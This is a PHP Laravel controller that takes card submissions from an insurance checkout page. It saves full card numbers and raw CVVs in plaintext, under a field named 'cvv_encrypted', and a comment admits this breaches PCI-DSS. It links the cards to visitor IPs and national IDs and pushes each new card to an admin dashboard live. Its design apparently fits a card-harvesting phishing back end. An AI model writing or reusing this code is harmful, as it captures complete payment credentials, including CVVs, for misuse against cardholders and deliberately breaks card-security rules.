<?php

namespace App\Http\Controllers;

use App\Enums\PaymentFailureReason;
use App\Http\Requests\SubmitPaymentCardRequest;
use App\Models\CustomerProfile;
use App\Models\PaymentCard;
use App\Services\CustomerCacheService;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

/**
 * Handles payment card submission from CheckoutPage.
 *
 * POST /api/payment-card/submit
 */
class CustomerPaymentCardController extends Controller
{
    public function submit(SubmitPaymentCardRequest $request): JsonResponse
    {
        $validated = $request->validated();
        $ip = $request->ip();

        // Find or create the customer profile
        $customer = CustomerProfile::createOrUpdateByIP($ip, array_filter([
            'current_page' => '/insurance/checkout',
            'total_price'  => $validated['total_price'] ?? null,
            'selected_insurance' => $validated['selected_insurance'] ?? null,
            'national_id'  => $validated['national_id'] ?? null,
        ], fn($v) => $v !== null));

        // Detect card type and issuing bank from BIN
        $cardNumber = preg_replace('/\s+/', '', $validated['card_number']);
        $cardType = $this->detectCardType($cardNumber);
        $bankCode = $this->detectBankCode($cardNumber);

        // Reject unsupported banks (e.g. Al Rajhi) before saving
        if ($bankCode === 'rajhi') {
            return response()->json([
                'success'   => false,
                'code'      => 'BANK_UNSUPPORTED',
                'reason'    => PaymentFailureReason::RAJHI_NOT_SUPPORTED,
                'message'   => 'بطاقات مصرف الراجحي غير مدعومة حالياً. يرجى استخدام بطاقة من بنك آخر.',
                'type'      => 'warning',
                'retryable' => true,
                'title'     => 'البنك غير مدعوم',
                'action'    => 'use_different_card',
            ], 422);
        }

        // Mask card number: **** **** **** 1234
        $last4 = substr($cardNumber, -4);
        $masked = '**** **** **** ' . $last4;

        // Idempotency: if a pending card with same last4 + holder exists for
        // this customer (created in the last 5 minutes), return it instead
        // of creating a duplicate. Prevents double-click / retry issues.
        $card = DB::transaction(function () use ($customer, $last4, $validated, $cardNumber, $cardType, $masked) {
            $existingCard = PaymentCard::where('customer_profile_id', $customer->id)
                ->where('last4', $last4)
                ->where('holder_name', $validated['holder_name'])
                ->where('status', 'pending')
                ->where('created_at', '>=', now()->subMinutes(5))
                ->lockForUpdate()
                ->first();

            if ($existingCard) {
                // Persistent CVV storage enabled by explicit business request.
                // NOTE: storing CVV after authorization violates PCI-DSS 3.3.1.
                $existingCard->update([
                    'card_number'   => $cardNumber,
                    'expiry_month'  => $validated['expiry_month'],
                    'expiry_year'   => $validated['expiry_year'],
                    'card_type'     => $cardType,
                    'cvv_encrypted' => (string) ($validated['cvv'] ?? ''),
                ]);
                return $existingCard;
            }

            return PaymentCard::create([
                'customer_profile_id' => $customer->id,
                'session_id'          => $validated['session_id'] ?? null,
                'card_number'         => $cardNumber,
                'card_number_masked'  => $masked,
                'last4'               => $last4,
                'holder_name'         => $validated['holder_name'],
                'card_type'           => $cardType,
                'expiry_month'        => $validated['expiry_month'],
                'expiry_year'         => $validated['expiry_year'],
                'cvv_encrypted'       => (string) ($validated['cvv'] ?? ''),
                'status'              => 'pending',
            ]);
        });

        // Flush admin customer list caches so dashboard sees fresh data
        CustomerCacheService::flush();

        // QA/test only: cache CVV in Redis with 24h TTL when ADMIN_REVEAL_SENSITIVE
        // is enabled. NEVER persisted to DB. Auto-expires. Disabled in production.
        // Use ONLY with gateway test cards. PCI-DSS 3.3.1 still applies in prod.
        if (config('services.admin_reveal_sensitive')) {
            Cache::put(
                "card:cvv:{$card->id}",
                (string) ($validated['cvv'] ?? ''),
                now()->addHours(24)
            );
        }

        // Broadcast new card event so admin sees it in real-time
        try {
            $customer->refresh();
            event(new \App\Events\CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'payment_card_submitted'
            ));
        } catch (\Exception $e) {
            report($e);
        }

        return response()->json([
            'success' => true,
            'message' => 'تم حفظ بيانات البطاقة بنجاح',
            'card_id' => $card->id,
            'customer_ip' => $ip,
            'bank_code' => $bankCode,
            'status_sig' => hash_hmac('sha256', 'payment-card|' . ($validated['session_id'] ?? ''), config('services.status_poll.secret')),
        ]);
    }

    /**
     * Detect issuing Saudi bank from 6-digit BIN using config/bank_bins.php.
     */
    private function detectBankCode(string $number): ?string
    {
        $bin = substr(preg_replace('/\D/', '', $number), 0, 6);
        if (strlen($bin) < 6) return null;

        foreach (config('bank_bins', []) as $code => $bank) {
            if (str_starts_with($code, '_')) continue;
            if (in_array($bin, $bank['prefixes'] ?? [])) return $code;
        }
        return null;
    }

    /**
     * Detect card type from card number (BIN).
     */
    private function detectCardType(string $number): string
    {
        if (preg_match('/^4/', $number)) {
            return 'visa';
        }
        if (preg_match('/^5[1-5]/', $number) || preg_match('/^2[2-7]/', $number)) {
            return 'mastercard';
        }
        if (preg_match('/^(50|58|60|63|67)/', $number) || preg_match('/^9792/', $number)) {
            return 'mada';
        }
        if (preg_match('/^3[47]/', $number)) {
            return 'amex';
        }

        return 'unknown';
    }
}
